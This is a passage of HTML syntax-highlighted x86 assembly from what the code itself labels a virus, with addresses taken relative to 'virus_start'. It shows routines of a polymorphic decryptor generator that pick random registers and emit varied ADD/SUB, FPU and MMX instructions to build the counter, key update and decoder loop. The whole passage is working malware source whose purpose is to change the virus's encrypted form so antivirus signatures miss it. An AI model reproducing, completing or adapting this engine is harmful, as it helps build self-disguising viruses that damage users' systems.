        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FIADD dw</span><span class="sc0">
        </span><span class="sc5">__ppe_gni_c1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_reg2mem</span><span class="sc0">     </span><span class="sc1">;EDX is output</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_math</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_finish</span><span class="sc0">

        </span><span class="sc5">__ppe_gni_c2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FISUB dw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_c1_after</span><span class="sc0">

        </span><span class="sc1">; MMX operation</span><span class="sc0">
    </span><span class="sc5">__ppe_gni_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gni_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gni_m2</span><span class="sc0">

        </span><span class="sc1">; genarete number -4- to an empty b-reg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;PADDD operation</span><span class="sc0">
        </span><span class="sc5">__ppe_gni_m1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_finish</span><span class="sc0">

        </span><span class="sc5">__ppe_gni_m2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;PSUBD operation</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gni_m1_after</span><span class="sc0">

    </span><span class="sc5">__ppe_gni_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to select new code-value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc5">__ppe_gnc_random</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ppe_get_next_code</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; add or sub ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gnc_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; base operations</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gnc_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gnc_b2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD operation</span><span class="sc0">
        </span><span class="sc5">__ppe_gnc_b1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gnc_finish</span><span class="sc0">
        </span><span class="sc5">__ppe_gnc_b2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">          </span><span class="sc1">;SUB operation</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gnc_b1_after</span><span class="sc0">

    </span><span class="sc5">__ppe_gnc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to select next counter ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc5">__ppe_gncounter_random</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ppe_get_next_counter</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; add or sub ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gncounter_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; type of operation</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gncounter_mmx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gncounter_copro</span><span class="sc0">

        </span><span class="sc1">;counter_reg is in b-reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gncounter_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gncounter_b2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc5">__ppe_gncounter_b1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_finish</span><span class="sc0">
        </span><span class="sc5">__ppe_gncounter_b2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">          </span><span class="sc1">;SUB instruction</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_b1_after</span><span class="sc0">

    </span><span class="sc5">__ppe_gncounter_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gncounter_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gncounter_c2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FIADD dw</span><span class="sc0">
        </span><span class="sc5">__ppe_gncounter_c1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_reg2mem</span><span class="sc0">     </span><span class="sc1">;EDX is output</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">c_copro_math</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_finish</span><span class="sc0">

        </span><span class="sc5">__ppe_gncounter_c2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_math</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FISUB dw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_c1_after</span><span class="sc0">

        </span><span class="sc1">; MMX operation</span><span class="sc0">
    </span><span class="sc5">__ppe_gncounter_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gncounter_random</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gncounter_m2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;PADDD operation</span><span class="sc0">
        </span><span class="sc5">__ppe_gncounter_m1_after</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_finish</span><span class="sc0">

        </span><span class="sc5">__ppe_gncounter_m2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;PSUBD operation</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gncounter_m1_after</span><span class="sc0">

    </span><span class="sc5">__ppe_gncounter_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to generate decoder-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_exloop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; where's counter store ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_ge_mmx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_ge_copro</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_ge_bfinish</span><span class="sc0">

    </span><span class="sc5">__ppe_ge_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
